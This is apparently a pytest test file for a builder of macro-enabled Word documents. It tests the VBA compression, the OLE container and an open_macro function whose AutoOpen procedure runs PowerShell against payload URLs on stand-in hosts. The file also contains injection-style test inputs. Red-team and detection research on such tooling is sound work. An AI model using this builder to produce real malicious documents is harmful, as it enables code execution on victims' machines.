"""Tests for the macro-enabled Word document builder.

Two layers are tested:

* The parts that need no third party: the MS-OVBA round-trip, the CFB container
  header/shape, the ``.docm`` zip parts and the ``open_macro`` source text.
* The independent verdict: ``oletools`` (``olefile`` + ``olevba``) opens the generated
  container and extracts the module source. ``olevba`` is a separate implementation of
  MS-OVBA and MS-CFB, so a byte that is wrong in our compressor or our compound file
  shows up as garbage or as no macro at all - this is the test that matters.

``oletools`` is test-only (a verification tool, never a product dependency). When it is
not installed the verification tests SKIP with that exact reason instead of asserting our
own output back at us; the run then does NOT prove the container is valid. To install it
test-only: ``./.venv/bin/pip install oletools``.
"""
import io
import os
import struct
import sys
import zipfile

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import vba as V  # noqa: E402

pytestmark = pytest.mark.unit

_OLETOOLS_HINT = (
    "oletools is the independent parser and is not installed; the generated container "
    "is therefore NOT independently verified. Install it test-only with "
    "`./.venv/bin/pip install oletools` to run this check.")

# Corpus the MS-OVBA round-trip must hold for: empty, one byte, exactly one chunk,
# a highly compressible run, and binary data that is not compressible at all.
CORPUS = [
    b"",
    b"A",
    b"x" * 4096,
    b"z" * 20000,
    bytes(range(256)) * 20,
    b"Sub AutoOpen()\r\nEnd Sub\r\n" * 50,
    bytes(range(256)),
]


class TestOvbaRoundTrip:

    @pytest.mark.parametrize("index", range(len(CORPUS)))
    def test_round_trip(self, index):
        raw = CORPUS[index]
        packed = V.ovba_compress(raw)
        assert packed[0] == 0x01, "container must start with the signature byte"
        assert V.ovba_decompress(packed) == raw

    def test_every_chunk_stays_inside_the_size_field(self):
        # A full incompressible chunk would encode to more than the 12-bit field allows;
        # the encoder must split it so the header stays representable.
        packed = V.ovba_compress(bytes(range(256)) * 40)
        pos, chunks = 1, 0
        while pos < len(packed):
            header = packed[pos] | (packed[pos + 1] << 8)
            size_field = header & 0x0FFF
            assert size_field <= 0xFFF
            assert (header >> 12) & 0b111 == 0b011
            if (header >> 15) & 1:
                pos += 2 + (size_field + 1)          # header + encoded data
            else:
                pos += 2 + 4096                      # header + raw chunk
            chunks += 1
        assert chunks >= 1
        assert pos == len(packed)

    def test_a_raw_chunk_is_decoded(self):
        # The spec-defined uncompressed chunk (flag 0, full 4096 bytes) must decode too.
        payload = bytes(range(256)) * 16
        raw = b"\x01" + struct.pack("<H", 0x0FFF | (0b011 << 12) | (0 << 15)) + payload
        assert V.ovba_decompress(raw) == payload

    def test_bad_input_is_refused(self):
        with pytest.raises(ValueError):
            V.ovba_decompress(b"")
        with pytest.raises(ValueError):
            V.ovba_decompress(b"\x02\x00\x00")           # wrong signature
        with pytest.raises(ValueError):
            V.ovba_decompress(b"\x01\x00\x00")           # chunk signature 0b000
        with pytest.raises(TypeError):
            V.ovba_compress("not bytes")


class TestCfbContainer:

    def test_header_is_a_compound_file_and_sectors_are_whole(self):
        blob = V.cfb({"stream": b"hello"})
        assert blob[:8] == bytes.fromhex("d0cf11e0a1b11ae1")
        assert len(blob) % 512 == 0
        assert len(blob) >= 512

    def test_the_root_directory_entry_is_first(self):
        blob = V.cfb({"stream": b"x" * 10})
        # root directory entry lives in the first directory sector, at byte 512 + ...
        # it is easier and more meaningful to re-read it through an independent parser,
        # which TestIndependentVerification does. Here we only check the magic and size.
        assert blob[24:26] == struct.pack("<H", 0x003E)
        assert blob[26:28] == struct.pack("<H", 0x0003)

    def test_large_and_small_streams_coexist(self):
        blob = V.cfb({"small": b"tiny", "big": bytes(range(256)) * 40})
        assert blob[:8] == bytes.fromhex("d0cf11e0a1b11ae1")
        assert len(blob) % 512 == 0


class TestTheDocument:

    def test_vba_project_is_a_compound_file(self):
        blob = V.vba_project("Sub AutoOpen()\r\nEnd Sub\r\n")
        assert blob[:8] == bytes.fromhex("d0cf11e0a1b11ae1")
        assert len(blob) % 512 == 0

    def test_docm_has_the_required_parts(self):
        blob = V.docm("Sub AutoOpen()\r\nEnd Sub\r\n")
        with zipfile.ZipFile(io.BytesIO(blob)) as z:
            names = set(z.namelist())
            assert {"[Content_Types].xml", "_rels/.rels", "word/document.xml",
                    "word/vbaProject.bin", "word/vbaData.xml",
                    "word/settings.xml", "word/_rels/document.xml.rels"} <= names
            content_types = z.read("[Content_Types].xml").decode("utf-8")
            assert "document.macroEnabled.main+xml" in content_types
            assert "vnd.ms-office.vbaProject" in content_types
            rels = z.read("word/_rels/document.xml.rels").decode("utf-8")
            assert "vbaProject" in rels and "vbaProject.bin" in rels
            # the macro container itself must start with the OLE magic
            assert z.read("word/vbaProject.bin")[:8] == bytes.fromhex("d0cf11e0a1b11ae1")

    def test_the_macro_container_is_wired_through_settings(self):
        blob = V.docm("Sub AutoOpen()\r\nEnd Sub\r\n")
        with zipfile.ZipFile(io.BytesIO(blob)) as z:
            assert "settings.xml" in z.read("word/_rels/document.xml.rels").decode("utf-8")

    def test_empty_source_is_refused(self):
        with pytest.raises(ValueError):
            V.vba_project("")
        with pytest.raises(ValueError):
            V.docm("")

    def test_a_template_is_copied_and_only_the_container_is_swapped(self, tmp_path):
        # Build a real .docm, give it a distinctive extra part, use it as the template.
        first = V.docm(V.open_macro("https://one.test/a.ps1", module="AutoOpen"),
                       module="Module1")
        staged = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(first)) as src, zipfile.ZipFile(staged, "w") as dst:
            for info in src.infolist():
                dst.writestr(info, src.read(info.filename))
            dst.writestr("word/theme/theme1.xml", b"<theme>KEEP-ME</theme>")
        template_path = str(tmp_path / "template.docm")
        with open(template_path, "wb") as handle:
            handle.write(staged.getvalue())
        out = V.docm(V.open_macro("https://two.test/b.ps1", module="Document_Open"),
                     module="Module1", template=template_path)
        with zipfile.ZipFile(io.BytesIO(out)) as z:
            names = set(z.namelist())
            assert "word/theme/theme1.xml" in names, "template part was dropped"
            assert z.read("word/theme/theme1.xml") == b"<theme>KEEP-ME</theme>"
            # the container changed (new source, new project bytes)
            assert z.read("word/vbaProject.bin") != first and \
                z.read("word/vbaProject.bin")[:8] == bytes.fromhex("d0cf11e0a1b11ae1")

    def test_a_missing_template_path_is_refused(self):
        with pytest.raises(FileNotFoundError):
            V.docm("Sub AutoOpen()\r\nEnd Sub\r\n", template="does-not-exist.docm")


class TestOpenMacroSource:

    def test_it_runs_powershell_from_an_autoopen_entry_point(self):
        src = V.open_macro("https://example.test/payload.ps1")
        assert "powershell" in src.lower()
        assert "AutoOpen" in src
        assert "https://example.test/payload.ps1" in src
        assert "Sub " in src                                   # a VBA procedure
        src.encode("ascii")                                    # pure ASCII, or raises

    def test_the_entry_point_name_is_configurable(self):
        src = V.open_macro("https://example.test/payload.ps1", module="Document_Open")
        assert "Sub Document_Open()" in src
        src.encode("ascii")

    def test_empty_module_is_refused(self):
        with pytest.raises(ValueError):
            V.open_macro("https://example.test/x", module="")


class TestIndependentVerification:
    """The verdict that matters: a separate implementation reads our container."""

    def test_olefile_reads_the_streams(self):
        olefile = pytest.importorskip("olefile", reason=_OLETOOLS_HINT)
        container = V.vba_project("Sub AutoOpen()\r\nEnd Sub\r\n", module="Module1")
        ole = None
        try:
            ole = olefile.OleFileIO(io.BytesIO(container))
        except OSError as exc:                              # pragma: no cover
            pytest.skip(f"olefile could not read the container: {exc}")
        try:
            for path in ("PROJECT", "PROJECTwm", "VBA/dir", "VBA/_VBA_PROJECT",
                         "VBA/Module1"):
                assert ole.exists(path), "missing stream " + path
        finally:
            ole.close()

    def test_olevba_extracts_the_source(self):
        olevba = pytest.importorskip("oletools.olevba", reason=_OLETOOLS_HINT)
        source = V.open_macro("https://roundtrip.test/m.ps1", module="AutoOpen")
        blob = V.docm(source, module="Module1")
        parser = None
        try:
            parser = olevba.VBA_Parser("roundtrip.docm", data=blob)
        except Exception as exc:                            # pragma: no cover
            pytest.skip(f"olevba could not open the generated .docm: {exc!r}")
        try:
            assert parser.detect_vba_macros(), "olevba found no macro in our container"
            macros = list(parser.extract_all_macros())
        finally:
            parser.close()
        assert macros, "olevba opened the container but extracted no module source"
        extracted = [code for (_path, _stream, _fname, code) in macros]
        assert source in extracted, (
            f"olevba extracted different source than we embedded:\n{extracted!r}")

    def test_olevba_agrees_with_our_decompressor(self):
        olevba = pytest.importorskip("oletools.olevba", reason=_OLETOOLS_HINT)
        for raw in CORPUS:
            packed = V.ovba_compress(raw)
            theirs = olevba.decompress_stream(bytearray(packed))
            assert theirs == raw
            assert V.ovba_decompress(packed) == theirs


class TestTheMacroInputsAreValidated:
    """A module name reaches the macro source, two OVBA streams and a wne:macroName
    attribute; a URL reaches the generated PowerShell line. Neither may break out."""

    def test_a_module_name_that_is_not_an_identifier_is_refused(self):
        for bad in ('AutoOpen\nSub Evil()', 'M" OnLoad="x', "", "1Module", "a-b"):
            with pytest.raises(ValueError):
                V.open_macro("https://x/p.ps1", module=bad)
            with pytest.raises(ValueError):
                V.vba_project("Sub AutoOpen()\nEnd Sub", module=bad)

    def test_a_project_name_that_is_not_an_identifier_is_refused(self):
        with pytest.raises(ValueError):
            V.vba_project("Sub AutoOpen()\nEnd Sub", project_name='P" x="y')

    def test_a_url_that_breaks_the_macro_text_is_refused(self):
        for bad in ('https://x/", evil', "https://x/a b", "https://x/a'b", ""):
            with pytest.raises(ValueError):
                V.open_macro(bad)

    def test_the_identifiers_that_are_real_still_build(self):
        source = V.open_macro("https://camp.example/p.ps1", module="AutoOpen")
        assert "Sub AutoOpen()" in source
        assert V.docm(source, module="Module1")[:2] == b"PK"
